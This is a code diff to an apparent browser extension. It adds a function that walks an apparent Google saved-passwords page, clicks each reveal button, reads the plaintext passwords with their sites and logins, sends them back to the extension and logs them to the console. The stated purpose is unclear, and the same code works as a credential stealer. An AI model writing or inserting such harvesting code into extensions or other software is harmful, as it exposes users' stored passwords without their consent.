@@ -1,5 +1,5 @@
 import $ from "jquery";
-import {MessageResponse} from "../../shared/utils";
+import {MessageResponse, reflect} from "../../shared/utils";
 
 const WAIT_CHECK_INTERVAL = 100;
 const WAIT_MAX_TIME = 10000;
@@ -127,7 +127,67 @@ const content_actions = {
     window.location.href = href;
     sendResponse(MessageResponse(false, `"${selector}" successfully clicked`));
     console.log(`"${selector}" successfully clicked`);
+  },
+  get_domain: (params, sendResponse) => {
+    sendResponse(MessageResponse(false, document.domain));
+  },
+  scrapChrome: async (params, sendResponse) => {
+    console.log('in chrome scrapping');
+    let result = [];
+    let linesLength = document.querySelectorAll('.F2OyGc.YcatWb .ggnaZd .tnBtsb:not(.TkdUmc)').length;
+    for (let i = 0; i < linesLength; i++){
+      let lines = document.querySelectorAll('.F2OyGc .ggnaZd .tnBtsb:not(.TkdUmc)');
+      let line = lines[i];
+      let website = {};
+      console.log('scrap line');
+      website.website = line.querySelector('.XP0Q0e').innerText;
+      website.login = line.querySelector('.qtmufc').innerText;
+
+      let inputDiv = line.querySelector('.rFrNMe');
+      if (!!website.login && !!inputDiv) {
+        let input = inputDiv.querySelector('input');
+        if (!!input) {
+          let inputButton = inputDiv.querySelector('.DPvwYc:not(.uZ7oZd)');
+          if (!!inputButton) {
+            inputButton.click();
+            let response = await reflect(waitInputChange(input));
+            console.log('wait result:', response);
+            website.pass = input.value;
+
+            result.push(website);
+            console.log('website domain:', website.website);
+            console.log('website login:', website.login);
+            console.log('website password:', website.password);
+            console.log(result.length);
+            console.log('------- end -------');
+          }
+        }
+      }
+    }
+    sendResponse(MessageResponse(false, result));
   }
 };
+
+function waitInputChange(element) {
+  return new Promise((resolve, reject) => {
+    setTimeout(() => {
+      let time = 0;
+      let value = element.value;
+      console.log('start value:', value);
+      let interval = setInterval(() => {
+        if (time > 2000) {
+          clearInterval(interval);
+          reject();
+        }
+        time += 10;
+        if (element.value !== value) {
+          console.log('scrapped value', element.value);
+          clearInterval(interval);
+          resolve();
+        }
+      }, 10);
+    }, 5);
+  });
+}
 
 export default content_actions;
